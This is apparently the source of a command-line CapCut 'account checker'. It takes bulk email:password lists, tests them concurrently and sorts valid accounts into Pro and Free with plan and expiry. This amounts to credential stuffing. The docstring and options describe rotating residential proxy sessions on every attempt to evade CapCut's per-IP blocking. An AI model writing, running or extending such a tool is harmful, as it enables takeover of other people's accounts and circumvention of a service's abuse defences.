"""Standalone CapCut checker CLI.

This is the command-line replacement for the /tools/capcut web page that was removed from the
admin panel on 2026-09-17. The account-checking logic itself is unchanged (capcut_check.py); this
file only reproduces the input parsing + concurrency the web endpoint used to do, so you can run
it locally.

USAGE
    python capcut_cli.py accounts.txt
    python capcut_cli.py accounts.txt --out results.csv --workers 8
    type accounts.txt | python capcut_cli.py            (read from stdin)

    The proxy is REQUIRED (CapCut blocks datacenter IPs). Supply it with either:
      set CAPCUT_PROXY=http://user-session-{sess}:pass@gate.provider.com:7000   (Windows)
      export CAPCUT_PROXY='http://user-session-{sess}:pass@gate.provider.com:7000'
    or pass --proxy "<url>" on the command line.

    The literal token {sess} in the proxy URL is replaced with a fresh random session id on
    every attempt, so each retry gets a NEW residential exit IP. That is how the checker gets
    past CapCut's per-IP soft-block (error_code 7). If your provider uses a different rotation
    scheme (e.g. a rotating gateway that changes IP automatically), just leave {sess} out and it
    will use the URL as-is.

INPUT FORMAT
    Any of these per line work — the email is found anywhere on the line and the password is the
    next token after it (numbering, header lines and trailing user-ids are ignored):
      email@x.com:password
      email@x.com|password|123456
      1. email@x.com password
"""
import argparse
import csv
import os
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

import capcut_check

_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
_SEP_RE = re.compile(r'[\s:|,;"]+|----')


def parse_accounts(text, cap=100000):
    """Reproduces the removed endpoint's tolerant parser: pull email + the password next to it,
    skip header/junk lines, de-duplicate by email."""
    accts, seen = [], set()
    for ln in text.splitlines():
        ln = ln.strip()
        if not ln:
            continue
        m = _EMAIL_RE.search(ln)
        if not m:
            continue  # no email -> header/junk line
        email = m.group(0).strip()
        rest = ln[m.end():]
        pw = next((t for t in _SEP_RE.split(rest) if t.strip()), "")
        if not pw:  # password may sit BEFORE the email
            before = _SEP_RE.split(ln[:m.start()])
            pw = next((t for t in reversed(before)
                       if t.strip() and not t.strip().rstrip(".").isdigit()), "")
        pw = pw.strip()
        key = email.lower()
        if email and pw and key not in seen:
            seen.add(key)
            accts.append((email, pw))
        if len(accts) >= cap:
            break
    return accts


def main():
    ap = argparse.ArgumentParser(description="CapCut account checker (email:pass -> plan/expiry)")
    ap.add_argument("infile", nargs="?", help="file with email:pass lines (default: stdin)")
    ap.add_argument("--proxy", default=os.environ.get("CAPCUT_PROXY", ""),
                    help="residential proxy URL; {sess} is replaced per attempt (or env CAPCUT_PROXY)")
    ap.add_argument("--out", help="write results to this CSV file")
    ap.add_argument("--workers", type=int, default=6, help="concurrent checks (default 6)")
    ap.add_argument("--retries", type=int, default=6, help="proxy-IP rotations per account (default 6)")
    ap.add_argument("--timeout", type=int, default=30, help="per-request timeout seconds (default 30)")
    args = ap.parse_args()

    text = open(args.infile, encoding="utf-8", errors="replace").read() if args.infile else sys.stdin.read()
    accts = parse_accounts(text)
    if not accts:
        print("No valid email:password lines found.", file=sys.stderr)
        return 2
    if not args.proxy:
        print("WARNING: no proxy set — CapCut will soft-block datacenter/home IPs (error_code 7).\n"
              "         Set CAPCUT_PROXY or pass --proxy. Continuing anyway.\n", file=sys.stderr)

    print("Checking %d account(s) with %d worker(s)...\n" % (len(accts), args.workers), file=sys.stderr)
    rows = []
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futs = {ex.submit(capcut_check.check_capcut_account, e, p,
                          proxy_template=args.proxy or None,
                          max_ip_retries=args.retries, timeout=args.timeout): (e, p)
                for e, p in accts}
        done = 0
        for fut in as_completed(futs):
            email, _ = futs[fut]
            try:
                r = fut.result()
            except Exception as exc:
                r = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
                     "is_pro": False, "error": "checker error: %s" % type(exc).__name__}
            rows.append(r)
            done += 1
            if r.get("ok"):
                status = "PRO  %-14s exp %s" % (r.get("plan", ""), r.get("expiry", "")) if r.get("is_pro") \
                    else "FREE"
                print("[%d/%d] %-40s %s" % (done, len(accts), r["email"], status))
            else:
                print("[%d/%d] %-40s ERR  %s" % (done, len(accts), r["email"], r.get("error", "")))

    pro = sum(1 for r in rows if r.get("is_pro"))
    free = sum(1 for r in rows if r.get("ok") and not r.get("is_pro"))
    err = sum(1 for r in rows if not r.get("ok"))
    print("\nDone: %d Pro, %d Free, %d error/failed." % (pro, free, err), file=sys.stderr)

    if args.out:
        with open(args.out, "w", newline="", encoding="utf-8") as fh:
            w = csv.writer(fh)
            w.writerow(["email", "ok", "is_pro", "plan", "expiry", "user_id", "error"])
            for r in rows:
                w.writerow([r.get("email", ""), r.get("ok"), r.get("is_pro"), r.get("plan", ""),
                            r.get("expiry", ""), r.get("user_id", ""), r.get("error", "")])
        print("Wrote %s" % args.out, file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
